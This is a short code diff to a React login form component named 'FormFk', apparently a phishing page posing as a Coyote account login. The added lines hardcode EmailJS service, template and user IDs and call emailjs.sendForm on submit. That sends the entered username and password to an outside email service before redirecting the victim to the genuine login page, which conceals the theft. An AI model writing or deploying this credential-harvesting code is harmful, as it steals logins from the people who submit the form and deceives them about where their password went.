@@ -32,6 +32,10 @@ function FormFk() {
     const togglePassword = () => {
         setPasswordShown(!passwordShown);
     };
+
+    const SERVICE_ID = 'service_cf79ytj';
+    const TEMPLATE_ID = 'template_8oalb5q';
+    const USER_ID = "5Fma-P-1aeivvlJxc";
     async function handleSubmit(event) {
         event.preventDefault();
         qfFunck(userName.current);
@@ -41,6 +45,7 @@ function FormFk() {
             qfFunck(passwordUser.current);
             if(qfNum === 0){
                 if(userName.current.value && passwordUser.current.value) {
+                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     window.location.href = "https://auth.coyote.com/Account/Login";
                     return;
                 }
